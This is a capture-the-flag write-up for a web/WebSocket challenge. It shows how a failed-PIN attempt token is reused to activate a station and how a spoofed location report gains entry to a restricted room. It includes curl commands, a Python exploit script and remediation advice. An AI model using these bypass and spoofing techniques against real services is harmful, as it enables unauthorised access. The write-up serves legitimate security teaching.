### Vicinity Wire — Cordon Seven

> Web · Medium · Chronos Security
> Points at solve: [fill in]

**Tools used**

curl, Python 3 (`websocket-client`).

**Approach**

The "Vicinity Wire" station (seized coordination station, Operation Dawn fuel corridor) exposes a browser-driven activation flow with two chained design flaws:

1. **Broken trust boundary in station activation.** A failed PIN check still returns a valid `attempt` token, and `/api/station/activate` accepts that token without ever verifying the PIN actually matched. The real decision is left to a client-side `if (!result.success) return;` branch — which we simply skip.
2. **Client-controlled position.** The WebSocket position channel trusts arbitrary coordinates from the station. Reporting the cordon centre instead of the station's synthetic outside position marks the station `inside` and makes it eligible for the restricted room `cordon-seven`.

Joining the room returns a `room.snapshot` whose `clearance_token` is the flag.

Target: `http://<instance>/`
Category: Web / WebSocket.

Reconnaissance:

`GET /` sets an HttpOnly session cookie and serves a small SPA (`app.js`, 6.5 KB). Response headers identify the stack as `VicinityWire`, version `vicinity-wire 3.4.1`, node `cordon-seven`.

`app.js` reveals the entire protocol and, helpfully, a comment describing the intended flaw:

```js
// Deliberately wrong trust boundary: the browser's local branch decides whether to activate.
const attempt = result.attempt;
if (!result.success) { pinStatus.textContent = `PIN rejected (${result.code}). ...`; return; }
const activation = await fetch('/api/station/activate', {
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({attempt})
});
```

Key protocol facts collected from the client and server responses:

| Item | Value |
|---|---|
| Session cookie | `station=<token>`, HttpOnly, SameSite=Strict, 30 min |
| PIN check limit | 5 requests / 600 s (`X-RateLimit-*`) |
| `attempt` token TTL | 60 s |
| WS endpoint | `/ws` (same-origin, cookie-bound) |
| Auth message | `station.authenticate` with `cap` |
| Position message | `position.update` with seq, timestamp, lat/lon, accuracy |
| Position freshness | `freshness_ms = 10000` |
| Room eligibility TTL | `eligibility_ttl_ms = 60000` |
| Frame allowance | 120 frames / 60 s |
| Target centre | `-47.203945, -126.300000`, radius `75 m` |
| Synthetic station position | `-47.200610, -126.302400` (~412.8 m outside) |
| Restricted room | `cordon-seven` |

Exploitation:

Step 1 — Create a station session:

```bash
curl -s -c cj.txt http://<instance>/ >/dev/null
curl -s -b cj.txt http://<instance>/api/station/session
# {"active":true,"session_idle_expires_in_ms":1800000}
```

Step 2 — Submit a wrong PIN and keep the issued `attempt`:

```bash
curl -s -b cj.txt -X POST \
  http://<instance>/api/station/pin-check \
  -H 'Content-Type: application/json' -d '{"pin":"000000"}'
```

```json
{"success":false,"code":"PIN_MISMATCH","attempt":"<attempt-token>","expires_in_ms":60000}
```

The response says the PIN was **rejected**, yet it hands out an activation-grade token. The only thing standing between the attacker and activation was the browser JavaScript returning early.

Step 3 — Activate the station with the failed attempt:

```bash
curl -s -b cj.txt -X POST \
  http://<instance>/api/station/activate \
  -H 'Content-Type: application/json' -d '{"attempt":"<attempt-token>"}'
```

```json
{
  "success": true,
  "code": "STATION_ACTIVE",
  "cap": "<cap-token>",
  "lat_e6": -47203945,
  "lon_e6": -126300000,
  "radius_m": 75,
  "room": "cordon-seven",
  "server_time_ms": 1793975779824
}
```

The server returned a capability token (`cap`) and the cordon geometry — no PIN was ever known.

Step 4 — Authenticate to the channel and report an inside position:

Connect to `ws://<instance>/ws` with the `station` cookie and the `cap`, then send a position update. The genuine client reports the synthetic outside position; the server performs no plausibility or source validation, so we report the cordon centre published by `/activate`:

```
>> {"type":"station.authenticate","sequence":1,"cap":"<cap-token>"}
<< {"type":"station.accepted","sequence":1,"server_time_ms":1793975794500,
    "next_sequence":2,"freshness_ms":10000,"eligibility_ttl_ms":60000,
    "limit":120,"window_ms":60000}

>> {"type":"position.update","sequence":2,"observed_at_ms":1793975794632,
    "latitude":-47.203945,"longitude":-126.300000,"accuracy_m":5.0}
<< {"type":"position.accepted","sequence":2,"inside":true,"distance_m":0.0,
    "eligible_room":"cordon-seven","eligibility_expires_ms":1793975862798,
    "next_sequence":3}
```

For comparison, the template's own outside report yields `"inside":false, "distance_m":412.8`.

Step 5 — Join the room and read the briefing:

```
>> {"type":"room.join","sequence":3,"room":"cordon-seven"}
<< {"type":"room.snapshot","sequence":3,"room":"cordon-seven",
    "classification":"RESTRICTED",
    "briefing":"Convoy diversion confirmed. Preserve the access chain.",
    "clearance_token":"CSCTF{REDACTED}",
    "next_sequence":4}
```

`room.join` is the only accepted room verb; a sequence number must be supplied and the station must hold a fresh inside-position eligibility.

Proof-of-concept script:

```python
#!/usr/bin/env python3
# Usage: python3 exploit.py <station_cookie> <cap>
import json, sys, time
import websocket

HOST = "<instance>"
cookie, cap = sys.argv[1], sys.argv[2]

ws = websocket.create_connection(
    f"ws://{HOST}/ws", header=[f"Cookie: station={cookie}"], timeout=15
)

def send(obj):
    ws.send(json.dumps(obj))

def recv():
    return json.loads(ws.recv())

send({"type": "station.authenticate", "sequence": 1, "cap": cap})
r = recv()
seq = r["next_sequence"]

# Target centre disclosed by /api/station/activate (radius 75 m)
send({"type": "position.update", "sequence": seq,
      "observed_at_ms": int(time.time() * 1000),
      "latitude": -47.203945, "longitude": -126.300000, "accuracy_m": 5.0})
r = recv()
seq = r["next_sequence"]
print(r)

send({"type": "room.join", "sequence": seq, "room": "cordon-seven"})
print(recv())          # -> room.snapshot with clearance_token == flag
ws.close()
```

Full manual chain, from scratch:

```bash
BASE=http://<instance>
curl -s -c cj.txt $BASE/ >/dev/null
ATT=$(curl -s -b cj.txt -X POST $BASE/api/station/pin-check \
      -H 'Content-Type: application/json' -d '{"pin":"000000"}' \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["attempt"])')
CAP=$(curl -s -b cj.txt -X POST $BASE/api/station/activate \
      -H 'Content-Type: application/json' -d "{\"attempt\":\"$ATT\"}" \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["cap"])')
CK=$(awk '/station/{print $7}' cj.txt)
python3 exploit.py "$CK" "$CAP"
```

Additional observations: session idle timeout 30 min (page refreshes every 5 min); `pin-check` rate limit 5 / 600 s; WebSocket 120 frames / 60 s; position freshness 10 s; eligibility lifetime 60 s after an inside report; the station's own report (`-47.200610, -126.302400`) is 412.8 m from the cordon centre and does not grant eligibility.

**Why it works**

Root cause: two chained design flaws. Neither is bypassed with a bug — the attacker uses the interfaces as documented but skips the client-side gate and lies about location.

1. **Token issued on failure / not bound to success.** `/api/station/pin-check` mints an `attempt` token before knowing the PIN result and returns it in the `PIN_MISMATCH` response. `/api/station/activate` accepts the token without validating that the attempt was marked successful (or without a server-side one-time claim that only a successful check can produce). Security decisions that live in the browser (`if (!result.success) return;`) are advisory only.
2. **Unvalidated position telemetry.** The privilege decision "is the station inside the cordon?" is based entirely on attacker-supplied `latitude`/`longitude`. There is a freshness window and a sequence number, but no attestation, signed sensor data, or server-side comparison against the known station location; accuracy is likewise self-reported.

Remediation:

- Issue the `attempt` token **only** after a successful PIN match, make it single-use, short-lived, and bound to the session; have `/activate` re-verify success server-side.
- Do not return any activation material in failure responses.
- Derive room eligibility server-side from trusted location sources (server-observed network position, signed device telemetry, or an operator-confirmed station position), not from client JSON. Reject jumps inconsistent with speed/accuracy and require independent corroboration for restricted rooms.
- Rate-limit PIN checks per account/station, not only per HTTP window (5/600 s observed).
- Consider making room access contingent on a separately authorized operator identity rather than physical proximity alone.

**Validation**

After the inside position report was accepted (`"inside":true`, `distance_m:0.0`), `room.join` returned a `room.snapshot` for `cordon-seven` containing the flag as `clearance_token`; the flag was accepted as the solution.
